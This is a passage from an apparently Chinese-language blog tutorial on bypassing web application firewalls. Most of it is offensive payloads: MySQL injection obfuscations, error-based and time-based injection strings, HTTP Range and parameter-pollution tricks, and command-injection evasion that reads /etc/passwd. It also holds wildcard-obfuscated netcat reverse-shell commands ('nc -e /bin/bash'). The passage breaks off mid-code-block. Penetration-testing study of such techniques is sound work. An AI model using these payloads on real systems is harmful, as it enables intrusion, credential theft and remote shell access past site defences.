iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)</span><br><span class="line">#360搜索</span><br><span class="line">Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0);</span><br><span class="line">#360网站安全检测</span><br><span class="line">360spider (http://webscan.360.cn)</span><br><span class="line">#Google</span><br><span class="line">Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)</span><br></pre></td></tr></table></figure><h3 id="6-其他特征的数据"><a href="#6-其他特征的数据" class="headerlink" title="6. 其他特征的数据"></a>6. 其他特征的数据</h3><p>除了前面提到的一些，实际情况下可能还有其他自定义的白名单</p><h2 id="六、输出层面"><a href="#六、输出层面" class="headerlink" title="六、输出层面"></a>六、输出层面</h2><p>如果存在某种WAF，检测到Response中的回显数据存在敏感信息，Resonse响应包可能会被阻断。（除了基本的回显数据通道，还有基于时间的数据通道）</p><h3 id="1-OOB"><a href="#1-OOB" class="headerlink" title="1. OOB"></a><strong>1. OOB</strong></h3><p>遇到这种情况，应对的方法之一就是使用OOB思想来绕过。如XXE OOB、SQL注入OOB、命令注入OOB等。</p><h3 id="2-Range"><a href="#2-Range" class="headerlink" title="2. Range"></a><strong>2. Range</strong></h3><p>假如页面可能有敏感数据返回，而当前攻击场景又利用不了OOB，你可以尝试使用Range方法来绕过防火墙。 </p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#添加了range，请求获取返回页面0到10的数据：</span><br><span class="line"><span class="keyword">POST</span> <span class="string">/test/test.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.17.138</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 9</span><br><span class="line"><span class="attribute">Range</span>: bytes=0-10</span><br><span class="line"></span><br><span class="line">user=root</span><br><span class="line"></span><br><span class="line">HTTP/1.1 <span class="number">206</span> Partial Content</span><br><span class="line"><span class="attribute">Server</span>: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.2.17</span><br><span class="line"><span class="attribute">Content-Range</span>: bytes 0-10/394</span><br><span class="line"><span class="attribute">Content-Length</span>: 11</span><br><span class="line"><span class="attribute">Content-Type</span>: text/html</span><br><span class="line"></span><br><span class="line">SELECT pass</span><br><span class="line">#添加了range，请求获取返回页面10到30的数据：</span><br><span class="line"><span class="keyword">POST</span> <span class="string">/test/test.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.17.138</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 9</span><br><span class="line"><span class="attribute">Range</span>: bytes=10-30</span><br><span class="line"></span><br><span class="line">user=root</span><br><span class="line"></span><br><span class="line">HTTP/1.1 <span class="number">206</span> Partial Content</span><br><span class="line"><span class="attribute">Server</span>: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.2.17</span><br><span class="line"><span class="attribute">Content-Range</span>: bytes 10-30/394</span><br><span class="line"><span class="attribute">Content-Length</span>: 21</span><br><span class="line"><span class="attribute">Content-Type</span>: text/html</span><br><span class="line"></span><br><span class="line">sword from user where</span><br></pre></td></tr></table></figure><h2 id="七、应用-编程语言-数据库-系统"><a href="#七、应用-编程语言-数据库-系统" class="headerlink" title="七、应用(编程语言/数据库)/系统"></a>七、应用(编程语言/数据库)/系统</h2><blockquote><p>这里不重点讲述，只做些收集和整理，大部分内容来源：<a href="https://zhengbao.wang/从http协议层面和数据库层面绕过waf/" target="_blank" rel="noopener">从http协议层面和数据库层面绕过waf</a></p></blockquote><h3 id="1-SQLi"><a href="#1-SQLi" class="headerlink" title="1. SQLi"></a>1. SQLi</h3><p>绕过SQL注入规则主要利用WAF规则本身的问题、未考虑到SQL语法变形、及后端数据库SQL语句语法特性。不同的数据库虽然遵守SQL标准，但是通常会加入特有的语法。WAF的防御策略要兼顾各种数据库的特殊语法，容易遗漏，从而被利用绕过WAF。</p><h4 id="（1）MySql特性"><a href="#（1）MySql特性" class="headerlink" title="（1）MySql特性"></a>（1）MySql特性</h4><p><strong>a. 注释符</strong></p><p>许多WAF都考虑到<code>/**/</code>可以作为空格，但是waf检测 <code>/\*.\*/</code>很消耗性能，工程师会折中，可能在检测中间引入一些特殊字符，例如：<code>/\w+/</code>。或者，WAF可能只中间检查n个字符<code>/*.{,n}*/</code>。根据以上想法，可以逐步测试绕过方法：</p><ul><li>先测试最基本的：union/**/select</li><li>再测试中间引入特殊字：<code>union/*aaaa%01bbs*/select</code></li><li>最后测试注释长度：<code>union/*aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa*/select</code></li></ul><p>同理，对于<code>/*!xxx*/</code>，可以采取类似的思路绕过WAF。</p><p>以下字符均可用作注释：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line">-- </span><br><span class="line">-- -</span><br><span class="line">--+</span><br><span class="line">/**/</span><br><span class="line">/*letmetest*/</span><br><span class="line">/*!xxx/**/xxx/*!*/*/</span><br><span class="line">;</span><br><span class="line">`</span><br></pre></td></tr></table></figure><p><strong>b. 空白符</strong></p><p>基于正则表达式的WAF， SQL注入规则使用正则表达式的“\s”匹配空格，例如”select\s+union”。利用正则表达式的空白符与MySQL空白符的不同可绕过WAF规则。如何这些MySQL的特性？通过fuzz,每次更改正常SQL语句的某部分，替换为其他字符，判断语法是否正确，即可判断出来MySQL语法特性。当然，也可以通过分析MySQL词法来发现语法特性，从而找到绕过方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">正则表达式 09 0A 0B 0D 20</span><br><span class="line">SQLite30A 0D 0C 09 20 </span><br><span class="line">MySQL509 0A 0B 0C 0D A0 20 </span><br><span class="line">PosgresSQL0A 0D 0C 09 20 </span><br><span class="line">Oracle 11g 00 0A 0D 0C 09 20 </span><br><span class="line">MSSQL01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16 ,17,18,19,1A,1B,1C,1D,1E,1F,20</span><br></pre></td></tr></table></figure><p>不用空白符的话,可以用括号,操作符,前缀,引号连接符号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;or+(1)sounds/**/like“1“--%a0-</span><br></pre></td></tr></table></figure><p>以下字符均可替代空格：</p><p><img src="/2020/05/20/WAF普及篇/15196361788182.png" alt="img"></p><ul><li>以上注释和空白符可用于所有位置代替空格</li></ul><p><strong>c. 函数分隔符</strong></p><p>对基于正则表达式的WAF，我们猜测安全工程师写WAF规则时，可能不知道函数名与左括号之间可以存在特殊字符，或者遗漏可以存在特殊字符。例如匹配函数”concat()”的规则写法，“concat(”或者”concat\s*(”，就没有考虑到一些特殊字符。相应的绕过方法，在特殊位置引入特殊的分隔符，逐个测试。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">concat%20(</span><br><span class="line">concat/**/(</span><br><span class="line">concat%0c(</span><br><span class="line">concat%a0(</span><br><span class="line">concat%0a(</span><br></pre></td></tr></table></figure><p>举一反三，寻找类似的关键位置，Fuzz特殊字符，发现更多的绕过新方法。猜测工程师们写规则因为各种原因容易遗漏的点，进行绕过WAF检测。</p><p><strong>d. 浮点数词法解析</strong></p><p>利用MySQL解析浮点数的特点，正则表达式无法匹配出单词union，但是MySQL词法解析成功解析出浮点数、sql关键字union。</p><ul><li>select * from users where id=8E0union select 1,2,3,4,5,6,7,8,9,0</li><li>select * from users where id=8.0union select 1,2,3,4,5,6,7,8,9,0</li><li><p>select * from users where id=\Nunion select 1,2,3,4,5,6,7,8,9,0</p><p><strong>e. Mysql特殊语法</strong></p></li></ul><p>最有效的发现手段，还是去读读MySQL词法分析源代码。和协议绕过类似，挖掘SQL标准与MySQL的词法分析差异是发现WAF SQL注入绕过的有效手段。以下是MySQL语法的一个举例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select&#123;x table_name&#125;from&#123;x information_schema.tables&#125;;</span><br></pre></td></tr></table></figure><p><strong>f. 等价函数</strong></p><ul><li><p>字符串截取函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Mid(version(),1,1)</span><br><span class="line">Substr(version(),1,1)</span><br><span class="line">Substring(version(),1,1)</span><br><span class="line">Lpad(version(),1,1)</span><br><span class="line">Rpad(version(),1,1)</span><br><span class="line">Left(version(),1)</span><br><span class="line">reverse(right(reverse(version()),1))</span><br><span class="line">&lt; &gt; 等价于 BETWEEN</span><br><span class="line">= 等价于 like</span><br></pre></td></tr></table></figure></li><li><p>字符串连接函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">concat(version(),&apos;|&apos;,user());</span><br><span class="line">concat_ws(&apos;|&apos;,1,2,3)</span><br></pre></td></tr></table></figure></li><li><p>延时注入相关函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(1) sleep(5) </span><br><span class="line">select * from user where id = 1 and if(left(database(),1)=&apos;g&apos;,sleep(5),1)</span><br><span class="line">(2) benchmark(count,expr)</span><br><span class="line">select * from user where id = 1 and if(left(database(),1)=&apos;t&apos;,(select benchmark(10000000,md5(&apos;boogle&apos;))),1)</span><br><span class="line">(3) 计算笛卡尔积</span><br><span class="line">select * from user where id = 1 and if(left(database(),1)=&apos;t&apos;,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),1)</span><br><span class="line">(4) 正则bug(受mysql版本影响，部分不可行)</span><br><span class="line">        select rpad(&apos;a&apos;,4999999,&apos;a&apos;) RLIKE concat(repeat(&apos;(a.*)+&apos;,30),&apos;b&apos;)</span><br></pre></td></tr></table></figure></li><li><p>报错函数（部分示例）</p><blockquote><p>不同报错函数都存在一些限制，比如对mysql版本和字符长度有一定要求</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">(1) 通过floor报错,注入语句如下:</span><br><span class="line">    and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br><span class="line"></span><br><span class="line">(2) 通过ExtractValue报错,注入语句如下:</span><br><span class="line">    and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));</span><br><span class="line"></span><br><span class="line">(3) 通过UpdateXml报错,注入语句如下:</span><br><span class="line">    and 1=(updatexml(1,concat(0x3a,(select user())),1))</span><br><span class="line">(4) 通过NAME_CONST报错,注入语句如下:</span><br><span class="line">    and exists(select * from (select * from(select name_const(version(),0))a join (select name_const(version(),0))b)c);</span><br><span class="line">(5) 通过join报错爆字段,注入语句如下:（在知道数据库跟表名的情况下使用才可以爆字段）</span><br><span class="line">    select * from (select * from 表名 a join 表名 b) c)</span><br><span class="line">    然后得到字段</span><br><span class="line">    如果想在爆下一个字段 就得加上using (已知的字段）</span><br><span class="line">    在下一个字段</span><br><span class="line">    如果想在爆下一个字段 就得加上using (已知的字段,已知的字段 ）</span><br><span class="line">    select * from (select * from 表名 a join 表名 b using (已知的字段,已知的字段 ） ) c)</span><br><span class="line">(6) 通过exp报错,注入语句如下:</span><br><span class="line">    and exp(~(select * from (select user() ) a) );</span><br><span class="line">(7) 通过GeometryCollection()报错,注入语句如下:</span><br><span class="line">    and geometrycollection((select * from(select * from(select user())a)b));</span><br><span class="line">(8) 通过polygon ()报错,注入语句如下:</span><br><span class="line">    and polygon((select * from(select * from(select user())a)b));</span><br><span class="line">(9) 通过multipoint ()报错,注入语句如下:</span><br><span class="line">    and multipoint((select * from(select * from(select user())a)b));</span><br><span class="line">(10) 通过multilinestring()报错,注入语句如下:</span><br><span class="line">    and multilinestring((select * from(select * from(select user())a)b));</span><br><span class="line">(11) 通过multipolygon()报错,注入语句如下:</span><br><span class="line">    and multipolygon((select * from(select * from(select user())a)b));</span><br><span class="line">(12) 通过linestring ()报错,注入语句如下:</span><br><span class="line">    and multilinestring((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure><p>利用Error-based的SQL注入函数进行绕过时，可以结合函数分隔符，或其他方法灵活运用。</p></li><li><p>过滤特殊字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(1)limit处的逗号： limit 1 offset 0</span><br><span class="line">(2)字符串截取处的逗号 mid处的逗号： mid(version() from 1 for 1)</span><br><span class="line">(3)union处的逗号： 通过join拼接。</span><br><span class="line">SELECT * FROM admin WHERE username = 1 union select * from (select 1)a join(select&#123;x schema_name&#125; from information_schema.SCHEMATA limit 1,1)b</span><br><span class="line">(4)操作符&lt;&gt;被过滤</span><br><span class="line">select * from users where id=1 and ascii(substr(database(),0,1))&gt;64</span><br><span class="line">此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,等)函数返回输入参数(n1,n2,n3,等)的最大值。那么上面的这条sql语句可以使用greatest变为如下的子句:</span><br><span class="line">select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64总结：使用greatest()绕过比较操作符。</span><br></pre></td></tr></table></figure></li><li><p><strong>运算符</strong></p><blockquote><p>判断注入时，可以充分利用这些机制</p></blockquote><ul><li>算数运算符</li><li>比较运算符</li><li>逻辑运算符</li><li>位运算符</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select &apos;12345&apos; like &apos;123%&apos;#更方便的布尔吧</span><br><span class="line">select &apos;beiji&apos; REGEXP &apos;ji&apos;</span><br><span class="line">select !(0|3&lt;&gt;3) #绕过and or xor || &amp;&amp;</span><br><span class="line">select 1^(0|3&lt;&gt;2)</span><br><span class="line">select 1&gt;&gt;!(1=0)</span><br></pre></td></tr></table></figure></li><li><p>其他函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#查找索引：返回的索引（从1开始的位置）的str在str1，str2，...列表中。如果str没有找到，则返回0。</span><br><span class="line">FIELD(str,str1,str2,str3,...)</span><br><span class="line">#bit_count 二进制数中包含1的个数。 </span><br><span class="line">BIT_COUNT(10);因为10转成二进制是1010，所以该结果就是2</span><br></pre></td></tr></table></figure></li></ul><h4 id="（2）由点及线"><a href="#（2）由点及线" class="headerlink" title="（2）由点及线"></a>（2）由点及线</h4><p>可以收集整理语句每个位置可以插入哪些字符进行混淆，在实际测试过程中，将payload拆分按位置逐个绕过</p><p>例句形式常见有5个位置即：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM admin WHERE username = </span><br><span class="line">-1【位置一】union【位置二】select【位置三】1,user()【位置四】from【位置五】admin</span><br></pre></td></tr></table></figure><p><strong>位置一 union之前</strong></p><ul><li><p>科学计数法 <code>1E0union</code></p></li><li><p>浮点数 <code>1.0union</code> <code>1.union</code> 等形式</p></li><li><p>浮点数特殊形式 <code>%1.union</code> <code>%2.union</code> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id =-1%23.union select 1,2,3 from users</span><br></pre></td></tr></table></figure></li><li><p>\N形式 <code>\Nunion</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id =\Nunion select 1,2,3 from users</span><br></pre></td></tr></table></figure></li></ul><p><strong>位置二 union和select之间</strong></p><ul><li><code>()</code>包裹select语句</li><li>union <strong>distinct</strong> select</li></ul><p><strong>位置三 select之后</strong></p><ul><li>特殊字符 <code>!</code> <code>+</code> <code>-</code> <code>@</code> <code>~</code><br>上面字符除<code>@</code>外，可单个或随机自由数量组合使用 如<code>select!~!!!-+~@1,2,3</code></li><li>引号:单/双/反引号 <code>select&quot;1&quot;,2,3</code></li><li>\N形式 <code>select\N,2,3</code></li><li>花括号形式 <code>select{x 1},2,3</code></li></ul><p><strong>位置四 from之前</strong></p><ul><li><p>科学计数法 <code>select 1,2,3E0from</code></p></li><li><p>浮点数 <code>select 1,2,3.0from</code> 或 <code>3.from</code></p></li><li><p>浮点数特殊形式 <code>%1.from</code> <code>%2.from</code> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select`username`,password,1%3.from users</span><br></pre></td></tr></table></figure></li><li><p>\N形式 <code>select 1,2,\Nfrom</code></p></li><li><p>带括号的函数 如<code>select 1,2,user()from</code></p></li><li><p>破浪号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,3`任意字符`from</span><br><span class="line">select 1,2,`id`from</span><br></pre></td></tr></table></figure></li><li><p>破浪号后加任意字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,3`booglefrom#后面只能识别为字段名</span><br></pre></td></tr></table></figure></li><li><p>花括号形式 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,&#123;x 3&#125;from</span><br></pre></td></tr></table></figure></li></ul><p><strong>位置五 from之后</strong></p><ul><li><p>破浪号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,3 from`user#后面只能识别为表名</span><br></pre></td></tr></table></figure></li><li><p>破浪号包裹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,3 from`user`</span><br><span class="line">select 1,2,3 from`user`xxxxx</span><br></pre></td></tr></table></figure></li><li><p>括号<code>()</code>包裹 <code>select 1,2,3 from(user)</code></p></li><li><p>花括号形式 <code>select 1,2,3 from{x user}</code></p></li><li><p>查询同一个表的情况下，可以加任意数字字母 <code>select * from user where id = -1 union select 1,user(),3 fromboogle123user</code>（没成功啊）</p></li><li><p>库名表名中间可以加空格<code>information_schema . tables</code></p></li></ul><h4 id="（3）容器特性"><a href="#（3）容器特性" class="headerlink" title="（3）容器特性"></a>（3）容器特性</h4><p><strong>HPP重复参数污染</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">+------------------------------------------------------------------+</span><br><span class="line">| Web Server      | Parameter Interpretation         | Example     |</span><br><span class="line">+------------------------------------------------------------------+</span><br><span class="line">| ASP.NET/IIS     | Concatenation by comma       | par1=val1,val2  |</span><br><span class="line">| ASP/IIS         | Concatenation by comma       | par1=val1,val2  |</span><br><span class="line">| PHP/Apache      | The last param is resulting  | par1=val2       |</span><br><span class="line">| JSP/Tomcat      | The first param is resulting | par1=val1       |</span><br><span class="line">| Perl/Apache     | The first param is resulting | par1=val1       |</span><br><span class="line">| DBMan           | Concatenation by two tildes  | par1=val1~~val2 |</span><br><span class="line">+------------------------------------------------------------------+</span><br></pre></td></tr></table></figure><p><strong>参数污染</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">+-----------------------------------------------------------+</span><br><span class="line">| Query String    |    Web Servers response / GET values    |</span><br><span class="line">+-----------------------------------------------------------+</span><br><span class="line">|         | Apache/2.2.16, PHP/5.3.3 | IIS6/ASP             |</span><br><span class="line">+-----------------------------------------------------------+</span><br><span class="line">| ?test[1=2       | test_1=2             | test[1=2         |</span><br><span class="line">| ?test=%         | test=%               | test=            |</span><br><span class="line">| ?test%00=1      | test=1               | test=1           |</span><br><span class="line">| ?test=1%001     | NULL                 | test=1           |</span><br><span class="line">| ?test+d=1+2     | test_d=1 2           | test d=1 2       |</span><br><span class="line">+-----------------------------------------------------------+</span><br></pre></td></tr></table></figure><h4 id="（4）检测注入点"><a href="#（4）检测注入点" class="headerlink" title="（4）检测注入点"></a>（4）检测注入点</h4><p>Bypass WAF的第一步是识别注入点，我们拿到一个URL，第一步判断参数是否有注入，然后再进行后续的绕过。简单的and 1=1 and 1=2判断肯定会被WAF拦截，我们需转变思路进行绕过，一般WAF为了平衡风险和业务的关系不会对下面数字型探测方式进行拦截，否则会产生大量误报影响正常业务运行。</p><p><strong>运算符</strong></p><blockquote><p>判断注入时，可以充分利用这些机制</p></blockquote><ul><li>算数运算符</li><li>比较运算符</li><li>逻辑运算符</li><li>位运算符</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select &apos;12345&apos; like &apos;123%&apos;#更方便的布尔吧</span><br><span class="line">select &apos;beiji&apos; REGEXP &apos;ji&apos;</span><br><span class="line">select !(0|3&lt;&gt;3) #绕过and or xor || &amp;&amp;</span><br><span class="line">select 1^(0|3&lt;&gt;2)</span><br><span class="line">select 1&gt;&gt;!(1=0)</span><br></pre></td></tr></table></figure><p><img src="/2020/05/20/WAF普及篇/15196361991311.png" alt="t-2.png"></p><p><img src="/2020/05/20/WAF普及篇/15196361998652.png" alt="t-3.png"></p><p><img src="/2020/05/20/WAF普及篇/15196361999516.png" alt="t-4.png"></p><p>如果<code>and</code>也会拦截，可以直接在参数上进行类似判断操作，如<code>id=1*0</code> 、<code>id=1*2</code>，除了以上方法，还有很多其它衍生出的识别绕过方法（比如：<code>and{`</code>1=1}`）</p><h4 id="（5）自动化思路"><a href="#（5）自动化思路" class="headerlink" title="（5）自动化思路"></a>（5）自动化思路</h4><ol><li><p>可以编写Sqlmap Tamper脚本</p></li><li><p>超级 SQL 注入工具的关键字替换，并保存为模板</p></li></ol><h4 id="（6）规则对抗经验"><a href="#（6）规则对抗经验" class="headerlink" title="（6）规则对抗经验"></a>（6）规则对抗经验</h4><p>在实际规则对抗过程中，有以下方法个人感觉比较好用些：</p><ol><li><p>针对单注释符/**/或者换行符%0A无强硬拦截的话，以此为基础结合其他混淆方式的多种组合，绕的还是比较快的（比如阿里云、腾讯云大概是这样的）</p></li><li><p>针对某一WAF产品，可以查看相关已公开分享的一些方法，即使一般都已经失效，但可以吸收核心绕过思路和方法组合，自行检查因为哪一块儿内容被识别拦截，稍加改动继续混淆即可快速绕过。（偷懒绕法）</p><p>​    举例：<a href="https://paper.seebug.org/218/#0x05" target="_blank" rel="noopener">https://paper.seebug.org/218/#0x05</a></p><p><img src="/2020/05/20/WAF普及篇/image-20200905112523356.png" alt="image-20200905112523356"></p><p><img src="/2020/05/20/WAF普及篇/image-20191211174253019.png" alt="image-20191211174253019"></p><p>当然，规则方面想具备较强绕过能力无惧任何WAF，除了对WAF本身的特性足够了解之外，还要对T-SQL语法非常熟悉，在这里也只是简单整理了一些公开的内容及思路，可以先带入门，后面的还需要自己深入研究。</p></li></ol><h3 id="2-XXE"><a href="#2-XXE" class="headerlink" title="2. XXE"></a>2. XXE</h3><h4 id="（1）实体化编码"><a href="#（1）实体化编码" class="headerlink" title="（1）实体化编码"></a>（1）实体化编码</h4><p>待补充，待测试（理论上ok）</p><h3 id="3-命令执行"><a href="#3-命令执行" class="headerlink" title="3. 命令执行"></a>3. 命令执行</h3><h4 id="（1）空格绕过"><a href="#（1）空格绕过" class="headerlink" title="（1）空格绕过"></a>（1）空格绕过</h4><p><strong>a. Linux</strong></p><p>以<code>cat /etc/passwd</code>命令为例，在Linux bash环境下去掉空格的写法如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat&lt;/etc/passwd</span><br><span class="line">&#123;cat,/etc/passwd&#125;</span><br><span class="line"><span class="meta">cat$</span><span class="bash">IFS/etc/passwd</span></span><br><span class="line">X=$'cat\x20/etc/passwd'&amp;&amp;$X</span><br></pre></td></tr></table></figure><p><strong>b. Windows</strong></p><p>以<code>ping baidu.com</code>为例，在windows CMD中替换空格的写法如下：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ping</span><span class="variable">%CommonProgramFiles:~10,-18%</span>baidu.com</span><br><span class="line"><span class="built_in">ping</span><span class="variable">%PROGRAMFILES:~10,-5%</span>baidu.com</span><br></pre></td></tr></table></figure><blockquote><p>当需要执行命令来读取文件时，很大概率需要一个空格字符或者斜杠。</p></blockquote><h4 id="（2）关键字绕过"><a href="#（2）关键字绕过" class="headerlink" title="（2）关键字绕过"></a>（2）关键字绕过</h4><p><strong>a. 通配符绕过</strong></p><p>若通过通配符绕过关键字，则linux bash的通配符与windows的类似，支持使用<code>?</code>代表单个字符和使用<code>*</code>代表多个字符的写法，如<code>/bin/cat /etc/passwd</code>命令可以有以下写法：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">查看文件</span></span><br><span class="line">/???/??t /???/p??s??</span><br><span class="line">/b??/ca? /e?c/pas?wd</span><br><span class="line">/b*/ca* /et*/pas*d</span><br><span class="line">/b??/ca* /e?c/pas*d</span><br><span class="line">/bin/cat /etc/passwd</span><br><span class="line"><span class="meta">#</span><span class="bash">nc</span></span><br><span class="line">/???/n? -e /???/b??h 2130706433 1337</span><br><span class="line">/bin/nc -e /bin/bash 127.0.0.1  1337</span><br><span class="line">/???/?c.??????????? -e /???/b??h 2130706433 1337</span><br><span class="line">/bin/nc.traditional -3 /bin/bash 127.0.0.1  1337</span><br><span class="line"><span class="meta">#</span><span class="bash">使用<span class="built_in">echo</span> 枚举文件</span></span><br><span class="line">echo/*/*ss*</span><br></pre></td></tr></table></figure><p><strong>b. 连接符混淆</strong></p><p>在Linux的bash环境下想要绕过关键字，则可以插入成对的单引号、双引号或反引号，其中反引号必须连着写，比如可以将<code>cat /etc/passwd</code>写为以下形式：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td 